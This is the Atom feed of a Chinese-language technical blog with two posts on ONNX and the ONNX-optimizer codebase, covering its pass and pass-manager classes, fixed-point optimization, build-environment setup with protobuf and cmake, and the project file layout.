<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="cn"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://leakbox258.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://leakbox258.github.io/" rel="alternate" type="text/html" hreflang="cn"/><updated>2025-09-12T14:18:50+00:00</updated><id>https://leakbox258.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">ONNX-opt 1</title><link href="https://leakbox258.github.io/blog/2025/ONNX-1/" rel="alternate" type="text/html" title="ONNX-opt 1"/><published>2025-09-12T00:00:00+00:00</published><updated>2025-09-12T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2025/ONNX-1</id><content type="html" xml:base="https://leakbox258.github.io/blog/2025/ONNX-1/"><![CDATA[<h5 id="onnx-optimizer">ONNX-optimizer</h5> <p>ONNX-opt 虽然是一个很古老的 AI 优化器，但可能也有一些参考价值 ONNX-opt 使用 Pass 对模型进行优化，参见源代码<code class="language-plaintext highlighter-rouge">onnx-optmizer/pass.h</code>中的 transform pass 的基类</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Pass</span> <span class="p">{</span>
  <span class="n">PassType</span> <span class="n">pass_type</span><span class="p">;</span>
  <span class="n">PassEfficiency</span> <span class="n">pass_efficiency</span><span class="p">;</span>
  <span class="n">PassOptimizationType</span> <span class="n">pass_optimization_type</span><span class="p">;</span>
    <span class="p">...</span>
<span class="p">};</span>

<span class="c1">// Enum that represents the type of optimization it is.</span>
<span class="k">enum</span> <span class="n">PassType</span> <span class="p">{</span>
  <span class="c1">// Class of optimizations that fuses operations.</span>
  <span class="n">Fuse</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="c1">// Class of optimizations that removes useless operations.</span>
  <span class="n">Nop</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
  <span class="c1">// Class of optimizations that includes some form of separation.</span>
  <span class="n">Separate</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span>
  <span class="c1">// Immutable pass, also sometimes referred to as an analysis pass.</span>
  <span class="n">Immutable</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span>
  <span class="c1">// Class of optimizations that replaces nodes with other.</span>
  <span class="n">Replace</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span>
  <span class="c1">// Other type of pass.</span>
  <span class="n">Other</span> <span class="o">=</span> <span class="mi">5</span>
<span class="p">};</span>
<span class="k">enum</span> <span class="n">PassOptimizationType</span> <span class="p">{</span>
  <span class="c1">// Is not optimizing anything. Most likely will be used in an immutable pass.</span>
  <span class="n">None</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="c1">// Optimizes for compute.</span>
  <span class="n">Compute</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
  <span class="c1">// Optimizes for memory.</span>
  <span class="n">Memory</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span>
  <span class="c1">// Optimizes for both compute and memory.</span>
  <span class="n">ComputeMemory</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span>
  <span class="c1">// Optimizes for stability (e.g. log-sum-exp trick).</span>
  <span class="n">Stability</span> <span class="o">=</span> <span class="mi">4</span>
<span class="p">};</span>
<span class="k">enum</span> <span class="n">PassEfficiency</span> <span class="p">{</span>
  <span class="c1">// A partially efficient optimization pass cannot guarantee that running two</span>
  <span class="c1">// consecutive passes</span>
  <span class="c1">// will return the same result as running a single pass.</span>
  <span class="n">Partial</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="c1">// A completely efficient optimization guarantees that running two consecutive</span>
  <span class="c1">// passes is equivalent</span>
  <span class="c1">// to running a single pass.</span>
  <span class="n">Complete</span> <span class="o">=</span> <span class="mi">1</span>
<span class="p">};</span>
</code></pre></div></div> <p>transform pass 基于操作类型划分有一下几类</p> <ul> <li><code class="language-plaintext highlighter-rouge">Fuse</code>: 进行算子合并</li> <li><code class="language-plaintext highlighter-rouge">Nop</code>: 进行冗余消除</li> <li><code class="language-plaintext highlighter-rouge">Separate</code>：进行算子拆分</li> <li><code class="language-plaintext highlighter-rouge">Immutable</code>: 前后模型不变的pass，有时指代 analysis pass</li> <li><code class="language-plaintext highlighter-rouge">Replace</code>: 对计算图节点进行替换</li> <li><code class="language-plaintext highlighter-rouge">Other</code>: 其他 基于pass的效果划分有一下几类</li> <li><code class="language-plaintext highlighter-rouge">None</code>: 无</li> <li><code class="language-plaintext highlighter-rouge">Compute</code>: 改善计算</li> <li><code class="language-plaintext highlighter-rouge">Memory</code>: 改善访存</li> <li><code class="language-plaintext highlighter-rouge">ComputeMemory</code>: …</li> <li><code class="language-plaintext highlighter-rouge">Stability</code>: 提高稳定性 最后，一个pass的效果可能是稳定的，也可能是不稳定的<br/><br/> 同样，还有analysis pass，定义相对简单, 依赖于上面的<code class="language-plaintext highlighter-rouge">Immutable</code> pass，一个 analysis pass 通过 <code class="language-plaintext highlighter-rouge">runPass</code> 的返回值获取分析结果， ```c++ class Pass { … virtual std::shared_ptr<PostPassAnalysis> runPass(Graph &amp;graph) = 0; ... }</PostPassAnalysis></li> </ul> <p>// Base struct representing result of a pass. struct PostPassAnalysis { virtual ~PostPassAnalysis() = default; };</p> <p>// Enum that represents the return type of the analysis. enum PassAnalysisType { // An empty analysis is returned. Most likely will return PostPassAnalysis. Empty = 0, // A count based analysis is returned. Most likely of type // CountBasedPassAnalysis CountBased = 1 };</p> <p>// Pass Analysis done after a predicate based pass. struct CountBasedPassAnalysis : PostPassAnalysis { Pass *pass; … bool graphChanged(); bool numSucceededTransforms();</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
</code></pre></div></div> <p>// Whether or not a repeated application of the pass might be useful. bool fixedPointOptimizationNeeded() { return this-&gt;graphChanged() &amp;&amp; pass-&gt;getPassEfficiency() == PassEfficiency::Partial; } … };</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`CountBasedPassAnalysis`应该是目前ONNX-opt唯一的`PostPassAnalysis`的继承示例（empty无需继承）&lt;br&gt;&lt;br&gt;
`Pass *pass` 是 `runPass` 中传入的 `this` 指针&lt;br&gt;&lt;br&gt;

##### PassManager
ONNX-opt 有两类Manager可用，对应上一节提到的两种`Optimizer`, 一种是`GeneralPassManager`，另一种是`FixedPointPassManager`
```c++
class PassManager {
    ...
};

class GeneralPassManager : public PassManager {
 public:
  GeneralPassManager() {}
  ~GeneralPassManager() override;

  void add(std::shared_ptr&lt;Pass&gt; pass) override;
  std::shared_ptr&lt;PassManagerAnalysis&gt; run(Graph&amp; graph) override;

 protected:
  std::vector&lt;std::shared_ptr&lt;Pass&gt;&gt; passes;
};

class FixedPointPassManager : public GeneralPassManager {
  std::shared_ptr&lt;PassManagerAnalysis&gt; run(Graph&amp; graph) override;
};
</code></pre></div></div> <p>没有任何理解上的难度，下面是如何实现这么一个 fix point：</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">PassManagerAnalysis</span><span class="o">&gt;</span> <span class="n">FixedPointPassManager</span><span class="o">::</span><span class="n">run</span><span class="p">(</span><span class="n">Graph</span><span class="o">&amp;</span> <span class="n">graph</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">bool</span> <span class="n">fixed_point_optimization_done</span><span class="p">;</span>

  <span class="k">do</span> <span class="p">{</span>
    <span class="n">fixed_point_optimization_done</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">Pass</span><span class="o">&gt;&amp;</span> <span class="n">pass</span> <span class="o">:</span> <span class="k">this</span><span class="o">-&gt;</span><span class="n">passes</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">PostPassAnalysis</span><span class="o">&gt;</span> <span class="n">analysis</span> <span class="o">=</span> <span class="n">pass</span><span class="o">-&gt;</span><span class="n">runPass</span><span class="p">(</span><span class="n">graph</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">pass</span><span class="o">-&gt;</span><span class="n">getPassAnalysisType</span><span class="p">()</span> <span class="o">==</span> <span class="n">PassAnalysisType</span><span class="o">::</span><span class="n">Empty</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">continue</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">CountBasedPassAnalysis</span><span class="o">&gt;</span> <span class="n">count_analysis</span> <span class="o">=</span>
          <span class="n">std</span><span class="o">::</span><span class="n">static_pointer_cast</span><span class="o">&lt;</span><span class="n">CountBasedPassAnalysis</span><span class="o">&gt;</span><span class="p">(</span><span class="n">analysis</span><span class="p">);</span>

      <span class="k">while</span> <span class="p">(</span><span class="n">count_analysis</span><span class="o">-&gt;</span><span class="n">fixedPointOptimizationNeeded</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">count_analysis</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">static_pointer_cast</span><span class="o">&lt;</span><span class="n">CountBasedPassAnalysis</span><span class="o">&gt;</span><span class="p">(</span>
            <span class="n">pass</span><span class="o">-&gt;</span><span class="n">runPass</span><span class="p">(</span><span class="n">graph</span><span class="p">));</span>
        <span class="n">fixed_point_optimization_done</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">fixed_point_optimization_done</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">PassManagerAnalysis</span><span class="o">&gt;</span><span class="p">(</span><span class="k">new</span> <span class="nf">EmptyPassManagerAnalysis</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div> <p>也是非常简单，当<code class="language-plaintext highlighter-rouge">runPass</code>返回的 analysis 结果不为空时，调用<code class="language-plaintext highlighter-rouge">fixedPointOptimizationNeeded</code>检查是否可以进行不动点迭代，然后一直迭代到没有不同点为止<br/><br/></p> <h5 id="两类-transform-pass">两类 transform pass</h5> <h6 id="predicatebasedpass">PredicateBasedPass</h6> <p>基于计算图上匹配字图的 transform pass，有两个关键方法<code class="language-plaintext highlighter-rouge">patternMatchPredicate</code>和<code class="language-plaintext highlighter-rouge">runTransform</code>, 在实际进行pass之前，先使用前者匹配字图, 如果匹配到则调用后者进行转换，这个流程在 <code class="language-plaintext highlighter-rouge">runPass -&gt; _runPassInternal</code> 执行。ONNX-opt 的大部分的 pass 都是这种类型</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">PredicateBasedPass</span> <span class="o">:</span> <span class="k">public</span> <span class="n">Pass</span> <span class="p">{</span>
 <span class="nl">public:</span>
  <span class="k">explicit</span> <span class="n">PredicateBasedPass</span><span class="p">(</span><span class="n">PassType</span> <span class="n">pass_type</span><span class="p">,</span>
                              <span class="n">PassEfficiency</span> <span class="n">pass_efficiency</span><span class="p">,</span>
                              <span class="n">PassOptimizationType</span> <span class="n">pass_optimization_type</span><span class="p">)</span>
      <span class="o">:</span> <span class="n">Pass</span><span class="p">(</span><span class="n">pass_type</span><span class="p">,</span> <span class="n">pass_efficiency</span><span class="p">,</span> <span class="n">pass_optimization_type</span><span class="p">)</span> <span class="p">{}</span>
  <span class="o">~</span><span class="n">PredicateBasedPass</span><span class="p">()</span> <span class="k">override</span><span class="p">;</span>

  <span class="k">virtual</span> <span class="kt">bool</span> <span class="n">patternMatchPredicate</span><span class="p">(</span><span class="n">Node</span> <span class="o">*</span><span class="n">node</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">virtual</span> <span class="kt">bool</span> <span class="n">runTransform</span><span class="p">(</span><span class="n">Node</span> <span class="o">*</span><span class="n">node</span><span class="p">,</span> <span class="n">Graph</span> <span class="o">&amp;</span><span class="n">graph</span><span class="p">,</span>
                            <span class="n">NodeDestroyType</span> <span class="o">&amp;</span><span class="n">destroy_current</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">PostPassAnalysis</span><span class="o">&gt;</span> <span class="n">runPass</span><span class="p">(</span><span class="n">Graph</span> <span class="o">&amp;</span><span class="n">graph</span><span class="p">)</span> <span class="k">override</span><span class="p">;</span>
  <span class="n">PassAnalysisType</span> <span class="n">getPassAnalysisType</span><span class="p">()</span> <span class="k">const</span> <span class="k">override</span><span class="p">;</span>

  <span class="k">static</span> <span class="kt">int</span> <span class="nf">getOpsetVersion</span><span class="p">(</span><span class="k">const</span> <span class="n">Graph</span> <span class="o">&amp;</span><span class="n">g</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Graph</span> <span class="o">&amp;</span><span class="n">mut_g</span> <span class="o">=</span> <span class="k">const_cast</span><span class="o">&lt;</span><span class="n">Graph</span> <span class="o">&amp;&gt;</span><span class="p">(</span><span class="n">g</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">OpSetID</span> <span class="o">&amp;</span><span class="n">opset</span> <span class="o">:</span> <span class="n">mut_g</span><span class="p">.</span><span class="n">opset_versions_mutable</span><span class="p">())</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">opset</span><span class="p">.</span><span class="n">domain</span><span class="p">()</span> <span class="o">==</span> <span class="s">""</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">opset</span><span class="p">.</span><span class="n">version</span><span class="p">();</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

 <span class="k">private</span><span class="o">:</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">_runPassInternal</span><span class="p">(</span><span class="n">Graph</span> <span class="o">&amp;</span><span class="n">graph</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div></div> <p>这里比较重要的是 <code class="language-plaintext highlighter-rouge">runTransform</code> 是如何修改图的，这个需要之后对 ONNX 的 <code class="language-plaintext highlighter-rouge">IR, Node, Graph</code> 等内容进行分析<br/><br/></p> <h6 id="fullgraphbasedpass">FullGraphBasedPass</h6> <p>在整个图上的优化:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// The most general pass which allows the user to run a pass given only a graph.</span>
<span class="k">class</span> <span class="nc">FullGraphBasedPass</span> <span class="o">:</span> <span class="k">public</span> <span class="n">Pass</span> <span class="p">{</span>
 <span class="nl">public:</span>
  <span class="k">explicit</span> <span class="n">FullGraphBasedPass</span><span class="p">(</span><span class="n">PassType</span> <span class="n">pass_type</span><span class="p">,</span>
                              <span class="n">PassEfficiency</span> <span class="n">pass_efficiency</span><span class="p">,</span>
                              <span class="n">PassOptimizationType</span> <span class="n">pass_optimization_type</span><span class="p">)</span>
      <span class="o">:</span> <span class="n">Pass</span><span class="p">(</span><span class="n">pass_type</span><span class="p">,</span> <span class="n">pass_efficiency</span><span class="p">,</span> <span class="n">pass_optimization_type</span><span class="p">)</span> <span class="p">{}</span>
  <span class="o">~</span><span class="n">FullGraphBasedPass</span><span class="p">()</span> <span class="k">override</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div> <p>举个例子，<code class="language-plaintext highlighter-rouge">eliminate_deadend.h</code>, 大致就是在整个计算图上，根据use关系，找到 unreachable node 并删除的优化</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">EliminateDead</span><span class="p">(</span><span class="n">Graph</span><span class="o">&amp;</span> <span class="n">graph</span><span class="p">)</span> <span class="p">{</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">nodes_removed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">auto</span> <span class="n">nodes</span> <span class="o">=</span> <span class="n">graph</span><span class="p">.</span><span class="n">nodes</span><span class="p">().</span><span class="n">reverse</span><span class="p">();</span>
<span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="n">it</span> <span class="o">=</span> <span class="n">nodes</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span> <span class="n">it</span> <span class="o">!=</span> <span class="n">nodes</span><span class="p">.</span><span class="n">end</span><span class="p">();</span> <span class="n">it</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">auto</span> <span class="n">node</span> <span class="o">=</span> <span class="o">*</span><span class="n">it</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">hasUses</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">nodes_removed</span><span class="o">++</span><span class="p">;</span>
    <span class="n">it</span><span class="p">.</span><span class="n">destroyCurrent</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">return</span> <span class="n">nodes_removed</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>可以看到，<code class="language-plaintext highlighter-rouge">nodes</code> 是整个图中节点的拓扑排序<br/><br/></p>]]></content><author><name>久菜合子</name></author><category term="dev"/><category term="nn"/><category term="onnx"/><category term="ai-compiler"/><summary type="html"><![CDATA[ONNX-optimizer ONNX-opt 虽然是一个很古老的 AI 优化器，但可能也有一些参考价值 ONNX-opt 使用 Pass 对模型进行优化，参见源代码onnx-optmizer/pass.h中的 transform pass 的基类 ```c++ class Pass { PassType pass_type; PassEfficiency pass_efficiency; PassOptimizationType pass_optimization_type; … };]]></summary></entry><entry><title type="html">ONNX-opt 0</title><link href="https://leakbox258.github.io/blog/2025/ONNX-0/" rel="alternate" type="text/html" title="ONNX-opt 0"/><published>2025-09-11T00:00:00+00:00</published><updated>2025-09-11T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2025/ONNX-0</id><content type="html" xml:base="https://leakbox258.github.io/blog/2025/ONNX-0/"><![CDATA[<p>今天是人类目前最大的湿件制导导弹命中目标的24(man!)周年</p> <h5 id="onnx-简介">ONNX 简介</h5> <p>ONNX 是一个开放的深度学习框架中立的表示格式，旨在促进不同深度学习工具之间的互操作性。通过 ONNX，开发者可以在不同的深度学习框架之间轻松地转换模型，从而实现更高效的模型部署和推理。<br/><br/> ONNX 和 ONNX-runtime 是两个重要的组成部分，前者是模型计算图和权重的中间表示，后者是一个推理引擎，如下图。<br/><br/></p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ONNX_opt-0-480.webp 480w,/assets/img/ONNX_opt-0-800.webp 800w,/assets/img/ONNX_opt-0-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/ONNX_opt-0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>所以 ONNX 主要用于 AI 模型的交换和部署：</p> <ul> <li>交换：对不同训练框架导出模型文件和权重文件进行转换</li> <li>部署：将模型文件和权重文件交给推理引擎进行运算</li> </ul> <p>上图中的三段式和传统编译器的结构不谋而和，ONNX 虽然并不存在计算图或者算子上的简化，但是其中的一些结构对于模型的抽象使得优化其实不是完全不可能（进入编译器舒适区间了）<br/><br/> 比如，现在已有的 <a href="https://github.com/daquexian/onnx-simplifier?tab=readme-ov-file">ONNX-simplifier</a>（虽然不是很流行），根据其描述是进行计算图上的常量折叠，以及他的third-part依赖<a href="https://github.com/onnx/optimizer">ONNX-optimizer</a><br/><br/> 相较于如何优化这方面，也很重要的方面是如何对 Pass 后的结果进行验证，下面是一些主流的 AI 编译器的测试方法（gen by Gemini）</p> <table> <thead> <tr> <th>框架/标准</th> <th>主要验证策略</th> <th>核心工具/方法</th> </tr> </thead> <tbody> <tr> <td>ONNX</td> <td>结构合法性验证、数值一致性对比</td> <td>onnx.checker、ONNX Runtime（对比不同优化级别/后端）、模型库测试</td> </tr> <tr> <td>MLIR</td> <td>逐层方言规约验证、Pass正确性断言</td> <td>Dialect Verifier、mlir-opt + FileCheck、端到端数值对比</td> </tr> <tr> <td>TVM</td> <td>端到端数值对比、中间层IR对比、底层代码单元测试</td> <td>Relay解释器（对比优化前后）、与NumPy对比、端到端与原始框架对比</td> </tr> <tr> <td>Triton</td> <td>与参考实现的数值一致性对比、梯度检查</td> <td>与PyTorch Eager实现的输出对比、torch.autograd.gradcheck进行梯度验证</td> </tr> </tbody> </table> <p>相比之下，ONNX 有一些优势，提供了足够的<code class="language-plaintext highlighter-rouge">语法与结构规约验证(Syntactic and Structural Verification)</code>的 Python API，不必一定要进行<code class="language-plaintext highlighter-rouge">数值一致性对比 (Numerical Consistency Check)</code>, 虽然后者可以通过 ONNX Runtime 来实现<br/><br/> 不过<code class="language-plaintext highlighter-rouge">数值一致性对比</code>还是很有必要的，但是对规模比较大的测例而言，算力也是一个问题<br/><br/> ONNX 的另一个优点在于，它不像是 TVM 进行端到端的训练和部署，所以研究性的工作可能会比轻松<br/><br/></p> <h5 id="onnx-环境配置">ONNX 环境配置</h5> <p>由于是进行研究，所以需要一套源代码 <a href="https://github.com/onnx/onnx/releases/tag/v1.19.0">ONNX 1.19.0 release</a> <br/><br/> 再次之前，墙裂建议使用<code class="language-plaintext highlighter-rouge">conda</code>等工具进行环境隔离<br/><br/> 在编译之前，需要安装<code class="language-plaintext highlighter-rouge">protobuf</code>，以下是源代码编译安装</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  git clone https://github.com/protocolbuffers/protobuf.git
  <span class="nb">cd </span>protobuf
  git checkout v5.29.2
  git submodule update <span class="nt">--init</span> <span class="nt">--recursive</span>
  <span class="nb">mkdir </span>build_source <span class="o">&amp;&amp;</span> <span class="nb">cd </span>build_source
  cmake <span class="nt">-Dprotobuf_BUILD_SHARED_LIBS</span><span class="o">=</span>OFF <span class="nt">-DCMAKE_INSTALL_PREFIX</span><span class="o">=</span>/usr <span class="nt">-Dprotobuf_BUILD_TESTS</span><span class="o">=</span>OFF <span class="nt">-DCMAKE_BUILD_TYPE</span><span class="o">=</span>Release <span class="nt">-DCMAKE_POSITION_INDEPENDENT_CODE</span><span class="o">=</span>ON ..
  cmake <span class="nt">--build</span> <span class="nb">.</span> <span class="nt">--target</span> <span class="nb">install</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">protobuf</code>是一个关键的序列化工具，之后的源代码中的部分<code class="language-plaintext highlighter-rouge">.cc</code>和<code class="language-plaintext highlighter-rouge">.h</code>文件是由其生成的 然后在主文件夹下使用<code class="language-plaintext highlighter-rouge">pip install -e . -v</code>就能编译安装，python 包管理器会将 onnx 关联到当前路径<br/><br/> 不过，毕竟需要看代码，所以<code class="language-plaintext highlighter-rouge">cmake</code>相关的需要进行一点变动：</p> <ul> <li>在<code class="language-plaintext highlighter-rouge">CMakeLists.txt</code>中，加入一行<code class="language-plaintext highlighter-rouge">set(CMAKE_EXPORT_COMPILE_COMMANDS TRUE) </code>, 以便生成<code class="language-plaintext highlighter-rouge">compile_commands.json</code>, 让clangd作为看c++时的lsp</li> <li>使用 <code class="language-plaintext highlighter-rouge">cmake -DENABLE_FASTER_BUILD=OFF .</code>, 如果开启快速编译，某些由<code class="language-plaintext highlighter-rouge">protobuf</code>生成的文件可能不会保存</li> </ul> <p>在生成的<code class="language-plaintext highlighter-rouge">onnx-ml.pb.h</code>中，lsp可能无法解析符号<code class="language-plaintext highlighter-rouge">PROTOBUF_NODISCARD</code>, <a href="https://github.com/protocolbuffers/protobuf/commit/1ceedf88ca4c6f151f08a10244005cee6c814f40">根据这个commit</a>，应该可以将其替换为编译器自带的<code class="language-plaintext highlighter-rouge">[[nodiscard]]</code><br/><br/> <code class="language-plaintext highlighter-rouge">onnx-ml.pb.h</code>会校验c++版本，由于只是需要其提供定义和符号，所以也将其注释<br/><br/></p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#if PROTOBUF_VERSION != 5029002
#error "Protobuf C++ gencode is built with an incompatible version of"
#error "Protobuf C++ headers/runtime. See"
#error "https://protobuf.dev/support/cross-version-runtime-guarantee/#cpp"
</span><span class="p">...</span>
<span class="p">...</span>
<span class="cp">#endif // ps: 这个endif在文件末尾
</span></code></pre></div></div> <p>最后, 为了进行数据一致性检验，可能需要下一个onnx runtime<br/><br/></p> <h5 id="onnx项目组成">ONNX项目组成</h5> <p>由于国内（其实也包括国外），ONNX 的资料不算很多，近年来有些式微，很多训练框架并不愿意全盘兼容ONNX，导致ONNX主打的框架迁移用处不大，然后 ONNX-runtime也不算特别出色。<br/><br/> 项目树（仅文件夹）:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>tree onnx <span class="nt">-d</span>
├── bin
├── common
├── defs
│   ├── controlflow
│   ├── generator
│   ├── image
│   ├── logical
│   ├── math
│   ├── nn
│   ├── object_detection
│   ├── optional
│   ├── __pycache__
│   ├── quantization
│   ├── reduction
│   ├── rnn
│   ├── sequence
│   ├── tensor
│   ├── text
│   ├── traditionalml
│   └── training
├── frontend
├── inliner
├── onnx_cpp2py_export
├── reference
</code></pre></div></div> <p>带<code class="language-plaintext highlighter-rouge">.pb</code>的是由<code class="language-plaintext highlighter-rouge">protobuf</code>导出的c++文件，带<code class="language-plaintext highlighter-rouge">_pb</code>的是导出的python文件</p> <ul> <li><code class="language-plaintext highlighter-rouge">bin</code>: 存放了一个<code class="language-plaintext highlighter-rouge">checker.py</code>, 方便导出</li> <li><code class="language-plaintext highlighter-rouge">common</code>: c++ 编写的实用程序，如 assert，file，path，platform等, 其中有不少的是<code class="language-plaintext highlighter-rouge">Highly Experimental</code>的</li> <li><code class="language-plaintext highlighter-rouge">defs</code>: 存放 ONNX 对于模型各个部件的定义，说实话从技术的角度上没什么好看的</li> <li><code class="language-plaintext highlighter-rouge">frontend</code>: 似乎是空的</li> <li><code class="language-plaintext highlighter-rouge">onnx_cpp2py_export</code> 以及 <code class="language-plaintext highlighter-rouge">onnx_cpp2py_export...so</code>: cpp 和 py 之间进行接口交换</li> <li><code class="language-plaintext highlighter-rouge">reference</code>: 定义了大量的算子，绝大多数是用<code class="language-plaintext highlighter-rouge">numpy</code>实现的</li> </ul> <h5 id="onnx-optimizer">ONNX-optimizer</h5> <p>ONNX-optimizer 以 ONNX 作为依赖，配置基本如上所示, 显然更有研究的价值，虽然它的star量大概是其他 AI 编译器的百分之一，贡献者也只有几十人<br/><br/> ONNX-optimizer 使用 ONNX 作为 third-part, 也就是应该首先按照上述方法构建ONNX的环境，否则lsp应该是没法使用的.<br/><br/> 首先是文件树：</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onnx-optimizer
├── c_api
│   ├── onnxoptimizer_c_api.cc
│   └── onnxoptimizer_c_api.h
├── cpp2py_export.cc
├── __init__.py
├── __main__.py
├── model_util.cc
├── model_util.h
├── onnxoptimizer_main.py
├── optimize.cc
├── optimize.h
├── pass.cc
├── passes
│   ├── adjust_add.h
│   ├── adjust_slice_and_matmul.h
│   ├── bitscast.h
│   ├── cse_util.h
│   ├── data_type.h
│   ├── eliminate_common_subexpression.h
│   ├── eliminate_consecutive_idempotent_ops.h
│   ├── eliminate_deadend.h
│   ├── eliminate_duplicate_initializer.h
│   ├── eliminate_identity.h
│   ├── eliminate_if_with_const_cond.h
│   ├── eliminate_nop_cast.h
│   ├── eliminate_nop_concat.h
│   ├── eliminate_nop_dropout.h
│   ├── eliminate_nop_expand.h
│   ├── eliminate_nop_flatten.h
│   ├── eliminate_nop_monotone_argmax.h
│   ├── eliminate_nop_pad.h
│   ├── eliminate_nop_reshape.h
│   ├── eliminate_nop_split.h
│   ├── eliminate_nop_transpose.h
│   ├── eliminate_nop_with_unit.h
│   ├── eliminate_shape_gather.h
│   ├── eliminate_shape_op.h
│   ├── eliminate_slice_after_shape.h
│   ├── eliminate_unused_initializer.h
│   ├── extract_constant_to_initializer.h
│   ├── fuse_add_bias_into_conv.h
│   ├── fuse_bn_into_conv.h
│   ├── fuse_concat_into_reshape.h
│   ├── fuse_consecutive_concats.h
│   ├── fuse_consecutive_log_softmax.h
│   ├── fuse_consecutive_reduce_unsqueeze.h
│   ├── fuse_consecutive_slices.h
│   ├── fuse_consecutive_squeezes.h
│   ├── fuse_consecutive_transposes.h
│   ├── fuse_consecutive_unsqueezes.h
│   ├── fuse_matmul_add_bias_into_gemm.h
│   ├── fuse_pad_into_conv.h
│   ├── fuse_pad_into_pool.h
│   ├── fuse_qkv.h
│   ├── fuse_transpose_into_gemm.h
│   ├── lift_lexical_references.h
│   ├── logging.h
│   ├── nop.h
│   ├── pass_util.cc
│   ├── pass_util.h
│   ├── rename_input_output.h
│   ├── replace_einsum_with_matmul.h
│   ├── rewrite_input_dtype.h
│   ├── set_unique_name_for_nodes.h
│   ├── split.h
│   ├── string_utils.h
│   ├── tensor_util.cc
│   └── tensor_util.h
├── pass.h
├── pass_manager.cc
├── pass_manager.h
├── pass_registry.cc
├── pass_registry.h
└── <span class="nb">test</span>
    └── optimizer_test.py
